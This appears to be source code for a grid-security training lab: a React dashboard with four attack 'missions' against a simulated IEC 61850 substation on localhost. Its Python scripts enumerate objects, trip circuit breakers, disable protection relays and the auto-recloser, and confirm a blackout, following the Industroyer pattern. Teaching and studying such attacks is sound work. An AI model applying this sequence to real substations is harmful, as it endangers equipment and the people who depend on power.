/**
 * GridLabMonitor — Lab Monitor for Power Grid Substation (IEC 61850)
 * 4-phase attack scenario inspired by Ukraine 2015/2016 + Industroyer/Crashoverride malware
 */

import { useState } from "react";
import { API_URL } from "../../socket";
import type { ProcessState } from "../../types/process";

interface Props {
  displayed: ProcessState;
  actual: ProcessState;
}

interface Mission {
  id: string;
  phase: number;
  title: string;
  difficulty: "BEGINNER" | "INTERMEDIATE" | "ADVANCED" | "EXPERT";
  objective: string;
  background: string;
  tool: string;
  steps: { label: string; code: string; note?: string }[];
  successCondition: string;
  impact: string[];
}

const MISSIONS: Mission[] = [
  {
    id: "recon",
    phase: 1,
    title: "IED Reconnaissance",
    difficulty: "BEGINNER",
    objective: "Discover the IEC 61850 MMS server and enumerate all data objects",
    background: `Before the 2015 Ukraine attack, BlackEnergy operators spent months mapping
SCADA infrastructure. The Industroyer malware (2016) contained a purpose-built
IEC 61850 module that could enumerate substation IEDs and map logical nodes
before issuing control commands. Reconnaissance is step 0 of every grid attack.`,
    tool: "python3 / netcat",
    steps: [
      {
        label: "Step 1 — Port scan",
        code: `# IEC 61850 MMS standard port is 102, training uses 5022
nmap -sT -p 5022 localhost`,
        note: "MMS = Manufacturing Message Specification (ISO 9506)",
      },
      {
        label: "Step 2 — Connect and identify the IED",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
banner = json.loads(s.recv(4096))
print("Banner:", json.dumps(banner, indent=2))

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

print("\\nIdentify:")
print(json.dumps(cmd({"cmd": "identify"}), indent=2))
EOF`,
      },
      {
        label: "Step 3 — Enumerate all IED objects (get_name_list)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)  # banner

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

result = cmd({"cmd": "get_name_list"})
print(f"Found {result['count']} objects across {len(result['logical_nodes'])} logical nodes")
print("Logical nodes:", result['logical_nodes'])
print("\\nDatasets:", result['datasets'])
print("\\nWritable attack targets:")
for obj in result['objects']:
    if obj['writable']:
        print(f"  {obj['ref']:40s}  [{obj['fc']}]  {obj['desc']}")
EOF`,
      },
      {
        label: "Step 4 — Read live measurements (DS_MEASUREMENTS dataset)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

data = cmd({"cmd": "read_dataset", "ref": "DS_MEASUREMENTS"})
print("Live substation measurements:")
for ref, v in data['values'].items():
    print(f"  {ref:42s}  {str(v['value']):10s}  {v['unit']}")
EOF`,
      },
    ],
    successCondition: "Successfully connected, identified the IED, and enumerated all writable objects",
    impact: ["Connect to port 5022", "Receive IED banner without authentication", "List all XCBR (breaker) and PROT (protection) objects"],
  },
  {
    id: "measurement",
    phase: 2,
    title: "Live Telemetry Monitoring",
    difficulty: "BEGINNER",
    objective: "Monitor real-time substation measurements to understand normal operating state",
    background: `Industroyer's IEC 61850 component polled substation measurements continuously
before the attack to understand the grid topology and identify the right sequence
for CB tripping. Knowing which transformers are loaded and which CBs to trip first
is critical for a coordinated attack — tripping a lightly loaded transformer
wastes the attack. Target the heavily loaded one.`,
    tool: "python3",
    steps: [
      {
        label: "Step 1 — Read all circuit breaker states",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

# Read DS_STATUS dataset (all CB positions + TX states)
status = cmd({"cmd": "read_dataset", "ref": "DS_STATUS"})
print("Circuit breaker positions:")
for ref, v in status['values'].items():
    if 'XCBR' in ref or 'ATCC' in ref or 'CSWI' in ref:
        state = "CLOSED" if v['value'] == True else ("OPEN/TRIPPED" if v['value'] == False else str(v['value']))
        print(f"  {ref:40s} → {state}")
EOF`,
      },
      {
        label: "Step 2 — Poll frequency and voltage continuously",
        code: `python3 << 'EOF'
import socket, json, time

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

print("Polling measurements (Ctrl+C to stop)...")
print(f"{'Time':8s}  {'Freq (Hz)':12s}  {'HV (kV)':10s}  {'LV (kV)':10s}  {'TX1 (%)':10s}  {'TX2 (%)':10s}")
for _ in range(20):
    data = cmd({"cmd": "read_dataset", "ref": "DS_MEASUREMENTS"})
    v = data['values']
    freq  = v['MMXU1.Hz.mag.f']['value']
    hv    = v['MMXU2.PhV.phsA.mag.f']['value']
    lv    = v['MMXU3.PhV.phsA.mag.f']['value']
    tx1   = v['ATCC1.TrCurr.mag.f']['value']
    tx2   = v['ATCC2.TrCurr.mag.f']['value']
    print(f"{time.strftime('%H:%M:%S')}  {freq:12.3f}  {hv:10.1f}  {lv:10.1f}  {tx1:10.1f}  {tx2:10.1f}")
    time.sleep(1)
EOF`,
        note: "Normal: Freq ~60.0 Hz, HV ~230 kV, LV ~115 kV, TX1/TX2 ~38%",
      },
      {
        label: "Step 3 — Read protection relay status",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

prot = cmd({"cmd": "read_dataset", "ref": "DS_PROTECTION"})
print("Protection relay status (ATTACK TARGETS):")
for ref, v in prot['values'].items():
    state = "ENABLED (blocking your attack)" if v['value'] else "DISABLED (attack path clear)"
    print(f"  {ref:30s} → {state}")
EOF`,
      },
    ],
    successCondition: "Read all measurements and confirmed protection relays are currently enabled",
    impact: ["Identify TX1 and TX2 loading %", "Confirm frequency is 60.0 Hz", "Note which protection relays are ENABLED — these are your targets in Phase 4"],
  },
  {
    id: "isolation",
    phase: 3,
    title: "Selective Circuit Breaker Tripping",
    difficulty: "INTERMEDIATE",
    objective: "Trip circuit breakers to shed load and overload transformers",
    background: `In the 2015 Ukraine attack, operators manually opened circuit breakers
in 30 substations within minutes. The 2016 Industroyer attack automated this
with purpose-built malware. The goal is selective isolation: trip feeders to
shed load from specific zones, or trip transformer breakers to cascade load
onto the surviving unit. CB3 (TX1 primary) is the high-value target —
when TX1 goes, TX2 must carry 190 MW alone on a 200 MVA rating.`,
    tool: "python3",
    steps: [
      {
        label: "Step 1 — Trip Feeder A (Industrial Zone)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

# Trip CB5 (Feeder A - Industrial, 80 MW)
# XCBR5.Pos.Oper.ctlVal = false → OPEN (trip)
result = cmd({
    "cmd": "write",
    "ref": "XCBR5.Pos.Oper.ctlVal",
    "value": False
})
print("Feeder A trip result:", result)
print("Industrial zone is now DARK (80 MW load shed)")
EOF`,
        note: "Watch the Substation View: CB5 turns red, Feeder A load goes dark",
      },
      {
        label: "Step 2 — Trip Feeder B (Residential Zone)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

result = cmd({
    "cmd": "write",
    "ref": "XCBR6.Pos.Oper.ctlVal",
    "value": False
})
print("Feeder B trip result:", result)
print("Residential zone is now DARK (65 MW load shed)")
EOF`,
      },
      {
        label: "Step 3 — Trip CB3 (TX1 Primary) — HIGH VALUE TARGET",
        code: `python3 << 'EOF'
import socket, json, time

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

# TRIP CB3 — Transformer TX1 disconnected from HV bus
result = cmd({
    "cmd": "write",
    "ref": "XCBR3.Pos.Oper.ctlVal",
    "value": False
})
print("TX1 primary breaker TRIPPED:", result)
print()
print("TX2 now carries all 190 MW on a 200 MVA rating → 95% loading!")
print("With protection ENABLED: overcurrent relay will trip TX2 → BLACKOUT")
print("With protection DISABLED: TX2 runs hot → thermal failure in ~90 seconds")
print()
print("Polling TX2 loading...")
for _ in range(10):
    data = cmd({"cmd": "read_dataset", "ref": "DS_MEASUREMENTS"})
    v = data['values']
    tx2  = v['ATCC2.TrCurr.mag.f']['value']
    tx2t = v['ATCC2.TrTmp.mag.f']['value']
    freq = v['MMXU1.Hz.mag.f']['value']
    print(f"  TX2 load: {tx2:5.1f}%  temp: {tx2t:5.1f}°C  freq: {freq:.3f} Hz")
    time.sleep(1)
EOF`,
        note: "TX2 will immediately alarm (>85%) and then trip or overheat depending on protection state",
      },
    ],
    successCondition: "TX2 loading exceeds 85% (overload alarm) after CB3 is tripped",
    impact: ["CB5/CB6: Selective load shedding (industrial/residential dark)", "CB3: TX1 offline → TX2 overloads at 95%", "Watch TX2 temperature rising in the Control Room trend chart"],
  },
  {
    id: "industroyer",
    phase: 4,
    title: "Industroyer Pattern — Coordinated Blackout",
    difficulty: "EXPERT",
    objective: "Disable protection relays and trip ALL circuit breakers to cause a permanent blackout",
    background: `The INDUSTROYER/CRASHOVERRIDE malware (attributed to Sandworm, Russia)
used in the 2016 Ukraine attack followed this exact sequence:

  1. Disable protective relays — prevents automatic recovery
  2. Open ALL circuit breakers simultaneously via IEC 61850
  3. Disable auto-recloser — blocks automatic reconnection
  4. Grid loses voltage; frequency collapses
  5. Operators cannot remotely reconnect (firmware wiped by wiper component)

The attack caused a blackout affecting 200,000+ customers in Kiev.
The TRISIS/Triton SIS attack (2017, Saudi Arabia) used the same principle:
disable the safety system BEFORE triggering the dangerous condition.

"Don't just break things. Break the thing that prevents things from breaking."`,
    tool: "python3",
    steps: [
      {
        label: "Step 1 — Disable ALL protection relays (the Industroyer setup step)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

protection_targets = [
    ("PROT1.Beh.stVal",  "Master protection relay"),
    ("DFPT1.Beh.stVal",  "Differential protection 87T"),
    ("OCPT1.Beh.stVal",  "Overcurrent relay 51"),
    ("UFPT1.Beh.stVal",  "Under-frequency relay 81L"),
    ("RREC1.Beh.stVal",  "Auto-recloser 79"),
]

print("DISABLING ALL PROTECTION RELAYS...")
for ref, desc in protection_targets:
    result = cmd({"cmd": "write", "ref": ref, "value": False})
    print(f"  {desc:40s} → {result['action']}")

print()
print("All protection DISABLED.")
print("The grid is now defenceless. No automatic recovery is possible.")
EOF`,
        note: "Without protection: transformers will thermally fail instead of safely tripping",
      },
      {
        label: "Step 2 — Rapid CB trip sequence (all 7 breakers)",
        code: `python3 << 'EOF'
import socket, json, time

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

cb_targets = [
    (7, "CB7 - Feeder C (Critical/Hospital)"),
    (6, "CB6 - Feeder B (Residential)"),
    (5, "CB5 - Feeder A (Industrial)"),
    (4, "CB4 - TX2 Primary"),
    (3, "CB3 - TX1 Primary"),
    (2, "CB2 - Source 2 (Grid interconnect)"),
    (1, "CB1 - Source 1 (Main generation)"),
]

print("INITIATING INDUSTROYER CB TRIP SEQUENCE...")
print("Tripping in reverse order: loads → transformers → sources")
print()

for cb_num, desc in cb_targets:
    ref    = f"XCBR{cb_num}.Pos.Oper.ctlVal"
    result = cmd({"cmd": "write", "ref": ref, "value": False})
    print(f"  TRIPPED: {desc}")
    time.sleep(0.3)  # rapid but not simultaneous (more realistic)

print()
print("ALL CIRCUIT BREAKERS OPEN.")
print("Grid frequency collapsing... Blackout in progress.")
EOF`,
        note: "Watch the substation diagram: each CB turns red one by one, then the entire diagram goes black",
      },
      {
        label: "Step 3 — Verify blackout and confirm auto-recloser is disabled",
        code: `python3 << 'EOF'
import socket, json, time

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

print("Post-attack verification:")
print()

# Read blackout status
blackout = cmd({"cmd": "read", "ref": "CSWI1.Pos.stVal"})
stress   = cmd({"cmd": "read", "ref": "CSWI1.GridStress.f"})
freq     = cmd({"cmd": "read", "ref": "MMXU1.Hz.mag.f"})
recloser = cmd({"cmd": "read", "ref": "RREC1.Beh.stVal"})

print(f"  Blackout:     {blackout['value']}")
print(f"  Grid stress:  {stress['value']:.0f}%")
print(f"  Frequency:    {freq['value']:.3f} Hz")
print(f"  Auto-recloser: {'ENABLED (can auto-reconnect)' if recloser['value'] else 'DISABLED (permanent blackout)'}")

# CB states
status = cmd({"cmd": "read_dataset", "ref": "DS_STATUS"})
print()
print("Circuit breaker states (all should be OPEN):")
for ref, v in status['values'].items():
    if 'XCBR' in ref and 'stVal' in ref:
        state = "CLOSED" if v['value'] else "OPEN (TRIPPED)"
        cb_n  = ref[4]
        print(f"  CB{cb_n}: {state}")

print()
print("Mission complete. The grid is dark and cannot auto-recover.")
EOF`,
      },
      {
        label: "Bonus: Attempt operator reconnection (it will fail)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5022))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

print("Operator attempting manual reconnection...")
print("(Auto-recloser disabled, protection disabled)")
print()

# Try to close all CBs
for i in range(1, 8):
    result = cmd({"cmd": "write", "ref": f"XCBR{i}.Pos.Oper.ctlVal", "value": True})
    print(f"  CB{i} close attempt: {result.get('action', result.get('message', '?'))}")

print()
print("Without protection relays and with damage, reconnection is unsafe.")
print("Operators must physically inspect and re-enable protection before reconnect.")
print("This is the real impact: hours/days of outage, not just minutes.")
EOF`,
        note: "The attack impact: disabling protection makes it UNSAFE to reconnect without physical inspection",
      },
    ],
    successCondition: "blackout=true, all 7 CBs open, autorecloser=false, frequency → 0 Hz",
    impact: [
      "190 MW total load lost (Industrial + Residential + Critical infrastructure)",
      "Grid frequency collapses (observe in Control Room trend)",
      "Auto-recloser disabled: operators cannot remotely restore power",
      "Without protection: TX1/TX2 thermally damaged before trip → physical replacement required",
      "Real-world consequence: hours to days of restoration time",
    ],
  },
];

const DIFF_COLORS: Record<string, string> = {
  BEGINNER:     "bg-green-900/50 text-green-300 border-green-700",
  INTERMEDIATE: "bg-amber-900/50 text-amber-300 border-amber-700",
  ADVANCED:     "bg-orange-900/50 text-orange-300 border-orange-700",
  EXPERT:       "bg-red-900/60 text-red-300 border-red-700",
};

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(text).then(() => {
          setCopied(true);
          setTimeout(() => setCopied(false), 1500);
        });
      }}
      className={`px-2 py-0.5 rounded text-[9px] font-mono border transition-colors ${
        copied
          ? "border-green-700 text-green-400 bg-green-900/20"
          : "border-gray-700 text-gray-400 hover:text-gray-200 hover:border-gray-600"
      }`}
    >
      {copied ? "Copied!" : "Copy"}
    </button>
  );
}

export function GridLabMonitor({ displayed, actual }: Props) {
  const [selectedMission, setSelectedMission] = useState(0);
  const [showObjectMap, setShowObjectMap] = useState(false);
  const mission = MISSIONS[selectedMission];
  const grid = actual.grid;
  if (!grid) return null;

  const cb = grid.cb_states || new Array(7).fill(true);
  const allCbsOpen = cb.every(c => !c);

  const isUnderAttack =
    !cb.every(Boolean) ||
    !grid.protection_enabled ||
    !grid.diff_prot_enabled ||
    !grid.overcurrent_enabled ||
    !grid.underfreq_enabled ||
    grid.blackout ||
    grid.tx1_tripped ||
    grid.tx2_tripped;

  const cbNames = ["Line 1 (Gen)", "Line 2 (Grid)", "TX1 Primary", "TX2 Primary",
                   "Feeder A (Ind)", "Feeder B (Res)", "Feeder C (Crit)"];

  const resetSystem = async () => {
    await fetch(`${API_URL}/api/reset`, { method: "POST" });
  };

  return (
    <div className="bg-gray-950 text-white p-4 h-full">
      {/* Header */}
      <div className="flex justify-between items-center mb-4">
        <div>
          <h1 className="text-xl font-mono font-bold text-amber-400">
            LAB MONITOR
          </h1>
          <p className="text-sm font-mono text-gray-500">
            Northgate Substation — Attack via IEC 61850 MMS, observe impact here
          </p>
        </div>
        <div className="flex gap-2">
          <button
            onClick={() => setShowObjectMap(!showObjectMap)}
            className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
          >
            {showObjectMap ? "HIDE" : "SHOW"} IEC OBJECT MAP
          </button>
          <button
            onClick={resetSystem}
            className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
          >
            RESET SYSTEM
          </button>
        </div>
      </div>

      {/* IEC Object Map (toggleable) */}
      {showObjectMap && (
        <div className="bg-gray-900 rounded-lg p-3 border border-gray-800 mb-4">
          <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">
            IEC 61850 OBJECT REFERENCES — Northgate Substation IED
          </h3>
          <div className="flex gap-2 mb-2 text-[10px] font-mono text-gray-500">
            <span>Protocol: <span className="text-cyan-400">MMS (ISO 9506)</span></span>
            <span>|</span>
            <span>Port: <span className="text-cyan-400">TCP 5022</span></span>
            <span>|</span>
            <span>Auth: <span className="text-red-400">None</span></span>
          </div>
          <table className="w-full text-xs font-mono">
            <thead>
              <tr className="text-gray-500 border-b border-gray-800">
                <th className="text-left p-1">Object Reference</th>
                <th className="text-left p-1">FC</th>
                <th className="text-left p-1">Access</th>
                <th className="text-left p-1">Description</th>
              </tr>
            </thead>
            <tbody>
              {[
                ["XCBR1–7.Pos.stVal",      "ST", "R", "CB1–7 position status"],
                ["XCBR1–7.Pos.Oper.ctlVal", "CO", "W", "ATTACKABLE — CB1–7 operate command"],
                ["MMXU1.Hz.mag.f",          "MX", "R", "System frequency (Hz)"],
                ["MMXU1.TotW.mag.f",        "MX", "R", "Active power (MW)"],
                ["MMXU2.PhV.phsA.mag.f",    "MX", "R", "HV bus voltage (kV)"],
                ["MMXU3.PhV.phsA.mag.f",    "MX", "R", "LV bus voltage (kV)"],
                ["ATCC1.TrCurr.mag.f",      "MX", "R", "TX1 loading %"],
                ["ATCC2.TrCurr.mag.f",      "MX", "R", "TX2 loading %"],
                ["ATCC1.TrTmp.mag.f",       "MX", "R", "TX1 winding temperature °C"],
                ["ATCC2.TrTmp.mag.f",       "MX", "R", "TX2 winding temperature °C"],
                ["PROT1.Beh.stVal",         "ST", "W", "ATTACKABLE — Master protection relay"],
                ["DFPT1.Beh.stVal",         "ST", "W", "ATTACKABLE — 87T differential relay"],
                ["OCPT1.Beh.stVal",         "ST", "W", "ATTACKABLE — 51 overcurrent relay"],
                ["UFPT1.Beh.stVal",         "ST", "W", "ATTACKABLE — 81L under-frequency relay"],
                ["RREC1.Beh.stVal",         "ST", "W", "ATTACKABLE — 79 auto-recloser"],
                ["CSWI1.Pos.stVal",         "ST", "R", "Blackout status"],
                ["CSWI1.GridStress.f",      "MX", "R", "Grid stress %"],
              ].map(([ref, fc, rw, desc]) => (
                <tr
                  key={ref}
                  className={`border-b border-gray-800/30 ${rw === "W" ? "text-red-300" : "text-gray-300"}`}
                >
                  <td className="p-1 text-cyan-400">{ref}</td>
                  <td className="p-1 text-gray-500">{fc}</td>
                  <td className="p-1">
                    <span className={`px-1 rounded ${rw === "W" ? "bg-red-900 text-red-300" : "bg-gray-800 text-gray-400"}`}>
                      {rw}
                    </span>
                  </td>
                  <td className="p-1 text-gray-500 text-[10px]">{desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
          <p className="text-[10px] text-red-400 mt-2">
            Red rows = writable (attackable) — no authentication required
          </p>
        </div>
      )}

      {/* Mission selector */}
      <div className="flex gap-2 mb-4">
        {MISSIONS.map((m, i) => (
          <button
            key={m.id}
            onClick={() => setSelectedMission(i)}
            className={`px-3 py-2 rounded font-mono text-xs border ${
              selectedMission === i
                ? "bg-amber-900 border-amber-600 text-amber-200"
                : "bg-gray-900 border-gray-700 text-gray-400 hover:border-gray-500"
            }`}
          >
            Phase {i + 1}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-3 gap-3">
        {/* Left: Mission briefing + commands */}
        <div className="col-span-2 space-y-3">
          {/* Mission briefing */}
          <div className="bg-gray-900 rounded-lg p-4 border border-gray-800">
            <div className="flex justify-between items-start mb-3">
              <h2 className="font-mono text-sm font-bold text-gray-200">
                Phase {mission.phase}: {mission.title}
              </h2>
              <span className={`text-xs font-mono px-2 py-1 rounded border ${DIFF_COLORS[mission.difficulty]}`}>
                {mission.difficulty}
              </span>
            </div>

            <div className="mb-3">
              <h3 className="text-xs font-mono text-amber-400 mb-1">OBJECTIVE</h3>
              <p className="text-xs text-gray-300">{mission.objective}</p>
            </div>

            <div className="mb-3">
              <h3 className="text-xs font-mono text-gray-500 mb-1">BACKGROUND</h3>
              <p className="text-xs text-gray-400 italic whitespace-pre-line">{mission.background}</p>
            </div>

            <div className="mb-3">
              <h3 className="text-xs font-mono text-green-400 mb-1">SUCCESS CONDITION</h3>
              <p className="text-xs text-green-300">{mission.successCondition}</p>
            </div>

            <div>
              <h3 className="text-xs font-mono text-blue-400 mb-1">WHERE TO CHECK IMPACT</h3>
              <ul className="text-xs text-gray-400 space-y-1">
                {mission.impact.map((item, i) => (
                  <li key={i} className="flex gap-2">
                    <span className="text-blue-500">-</span> {item}
                  </li>
                ))}
              </ul>
            </div>
          </div>

          {/* Commands */}
          <div className="bg-black rounded-lg border border-gray-800 overflow-hidden">
            <div className="px-4 py-2 border-b border-gray-800">
              <h3 className="text-xs font-mono text-green-400 font-bold">
                COMMANDS — Run these in your terminal
              </h3>
            </div>
            <div className="p-4 space-y-4">
              {mission.steps.map((step, i) => (
                <div key={i}>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-xs font-mono text-gray-400 font-bold">{step.label}</span>
                    <CopyButton text={step.code} />
                  </div>
                  <pre className="text-xs font-mono text-green-400 overflow-x-auto whitespace-pre bg-gray-950/50 p-2 rounded">
                    {step.code}
                  </pre>
                  {step.note && (
                    <p className="text-[10px] font-mono text-blue-400 mt-1 pl-2 border-l border-blue-800">
                      ℹ {step.note}
                    </p>
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Right: Live state */}
        <div className="space-y-3">
          {/* Attack detection */}
          <div
            className={`rounded-lg p-3 border font-mono text-xs text-center font-bold ${
              isUnderAttack
                ? "bg-red-900/30 border-red-600 text-red-300 animate-pulse"
                : "bg-green-900/30 border-green-800 text-green-400"
            }`}
          >
            {isUnderAttack
              ? "ATTACK DETECTED — Abnormal values"
              : "NO ATTACK — System normal"}
          </div>

          {/* Grid Status */}
          <div className="bg-gray-900 rounded-lg p-3 border border-gray-800">
            <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">
              GRID STATUS
            </h3>

            {/* Frequency */}
            <div className={`rounded p-2 mb-2 text-center border ${
              grid.frequency < 58.5 ? "border-red-700 bg-red-900/20" :
              grid.frequency < 59.5 ? "border-amber-700 bg-amber-900/10" :
              "border-green-800 bg-green-900/10"
            }`}>
              <div className="text-[9px] text-gray-500 uppercase font-mono">Frequency</div>
              <div className={`text-lg font-bold font-mono ${
                grid.frequency < 58.5 ? "text-red-400 animate-pulse" :
                grid.frequency < 59.5 ? "text-amber-400" : "text-green-400"
              }`}>
                {grid.frequency > 0 ? grid.frequency.toFixed(3) : "0.000"} Hz
              </div>
            </div>

            {/* CB states */}
            <div className="space-y-0.5 mb-2">
              {cbNames.map((name, i) => (
                <div key={i} className="flex items-center justify-between text-[10px] font-mono">
                  <span className="text-gray-500">CB{i + 1}</span>
                  <span className={`font-bold ${cb[i] ? "text-green-500" : "text-red-400"}`}>
                    {cb[i] ? "■ CLOSED" : "□ OPEN"}
                  </span>
                </div>
              ))}
            </div>

            {/* TX stats */}
            <div className="border-t border-gray-800 pt-2 space-y-1">
              {[
                { label: "TX1", load: grid.tx1_load_pct, temp: grid.tx1_temp, tripped: grid.tx1_tripped },
                { label: "TX2", load: grid.tx2_load_pct, temp: grid.tx2_temp, tripped: grid.tx2_tripped },
              ].map(tx => (
                <div key={tx.label} className="flex justify-between text-[10px] font-mono">
                  <span className="text-gray-500">{tx.label}</span>
                  <span className={tx.tripped ? "text-red-400 font-bold" : tx.load > 85 ? "text-amber-400" : "text-cyan-300"}>
                    {tx.tripped ? "TRIPPED" : `${tx.load.toFixed(0)}% · ${tx.temp.toFixed(0)}°C`}
                  </span>
                </div>
              ))}
            </div>

            {grid.blackout && (
              <div className="mt-2 p-2 rounded bg-red-900/40 border border-red-700 text-center">
                <div className="text-red-300 font-bold text-xs animate-pulse font-mono">BLACKOUT</div>
                <div className="text-red-500 text-[9px] font-mono">190 MW supply lost</div>
              </div>
            )}
          </div>

          {/* Protection Relays */}
          <div className="bg-gray-900 rounded-lg p-3 border border-red-900/30">
            <h3 className="text-xs font-mono text-red-400 mb-2 font-bold">
              PROTECTION RELAYS
            </h3>
            <div className="space-y-1.5 text-xs font-mono">
              {[
                { label: "Master Protection", val: grid.protection_enabled },
                { label: "Differential (87T)", val: grid.diff_prot_enabled },
                { label: "Overcurrent (51)", val: grid.overcurrent_enabled },
                { label: "Under-Freq (81L)", val: grid.underfreq_enabled },
                { label: "Auto-Recloser (79)", val: grid.autorecloser_enabled },
              ].map(({ label, val }) => (
                <div key={label} className="flex justify-between">
                  <span className="text-gray-500">{label}</span>
                  <span className={!val ? "text-red-400 font-bold" : "text-gray-300"}>
                    {val ? "ON" : "OFF ⚠"}
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* Phase 4: Industroyer progress */}
          {mission.id === "industroyer" && (
            <div className={`rounded-lg border p-3 ${
              allCbsOpen && grid.blackout && !grid.autorecloser_enabled
                ? "border-red-700 bg-red-900/20"
                : "border-gray-800 bg-gray-900"
            }`}>
              <h3 className="text-xs font-mono text-gray-500 mb-2 font-bold">
                INDUSTROYER PROGRESS
              </h3>
              <div className="space-y-1">
                {[
                  { label: "Protection Disabled", done: !grid.protection_enabled },
                  { label: "Differential OFF",    done: !grid.diff_prot_enabled },
                  { label: "Overcurrent OFF",     done: !grid.overcurrent_enabled },
                  { label: "UFLS OFF",            done: !grid.underfreq_enabled },
                  { label: "Auto-Recloser OFF",   done: !grid.autorecloser_enabled },
                  { label: "All 7 CBs Open",      done: allCbsOpen },
                  { label: "Freq < 58 Hz",        done: grid.frequency < 58 && grid.frequency > 0 },
                  { label: "BLACKOUT Achieved",   done: grid.blackout },
                ].map(item => (
                  <div key={item.label} className="flex items-center gap-1.5 text-[10px] font-mono">
                    <span className={item.done ? "text-green-500" : "text-gray-700"}>
                      {item.done ? "✓" : "○"}
                    </span>
                    <span className={item.done ? "text-gray-300" : "text-gray-600"}>{item.label}</span>
                  </div>
                ))}
              </div>
              {allCbsOpen && grid.blackout && !grid.autorecloser_enabled && (
                <div className="mt-2 p-2 rounded bg-red-900/40 border border-red-700 text-center">
                  <div className="text-red-300 font-bold text-[10px] animate-pulse font-mono">
                    ATTACK COMPLETE — INDUSTROYER EXECUTED
                  </div>
                  <div className="text-red-500 text-[9px] font-mono mt-1">
                    Permanent blackout · 190 MW lost
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
